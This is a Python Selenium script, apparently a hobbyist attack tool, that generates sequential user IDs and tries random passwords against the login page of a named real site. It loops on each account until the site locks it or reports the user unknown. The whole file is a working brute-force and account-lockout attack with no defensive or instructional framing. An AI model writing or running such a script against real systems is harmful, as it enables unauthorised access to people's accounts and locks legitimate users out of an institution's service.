#!/usr/bin/python
# -*- coding: UTF-8 -*-

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import random
import os
import sys

global driver
driver = webdriver.PhantomJS()
#driver = webdriver.Chrome()
os.system('clear')

logo = open("logo.txt","r")
print logo.read()
time.sleep(5)
os.system('clear')

def makeComboGRIT1(n):
	users = []
	for i in range(1,n+1):
		userID = '017LTF'
		if i < 10:
			userID += '0'
		userID += '%d'%i
		users.append(userID)
	return users

def makeComboGRIT2(n):
	users = []
	for i in range(1,n+1):
		userID = '016LTF'
		if i < 10:
			userID += '0'
		userID += '%d'%i
		users.append(userID)
	return users

def makeComboGRIT3(n):
	users = []
	for i in range(1,n+1):
		userID = '015LTF'
		if i < 10:
			userID += '0'
		userID += '%d'%i
		users.append(userID)
	return users

def generatePassword():
	password = random.choice('AUJKLMDNPQ')
	password += str(random.randint(1, 10))
	password += str(random.randint(1, 10))
	return password

def Attack(userID):
	while True:
		print "[+]-- Attack on : %s --[+]"%userID
		driver.get('https://iutiag.net/?lg=en')
		try:
			email = driver.find_element_by_xpath('/html/body/form/table/tbody/tr[1]/td[2]/input')
		except:
			print "Check Internet Connection"	
			sys.exit()
		email.send_keys(userID)
		password = driver.find_element_by_xpath('/html/body/form/table/tbody/tr[2]/td[2]/input')
		lePassword = generatePassword()
		password.send_keys(lePassword)
		login = driver.find_element_by_xpath('/html/body/form/table/tbody/tr[4]/th/input')
		login.click()
		if driver.find_element_by_xpath('/html/body').text == "Locked access; Contact the administration":
			print "--> Result : Locked"
			break
		if driver.find_element_by_xpath('/html/body/h2[1]').text == "Identifiant inconnu":
			print "--> Result : Unknow Users"
			driver.quit()
			break
		time.sleep(2)
	return driver

#users = ['']
users = makeComboGRIT1(100)

try:
	print "[+] Exploit System is Start [+]"
	print "[->] press ctrl+c to kill the process [<-]\n"
	for user in users:
		Attack(user)
except KeyboardInterrupt:
	print "\nprogramme is going to Die :p , you are a Good Man\n"
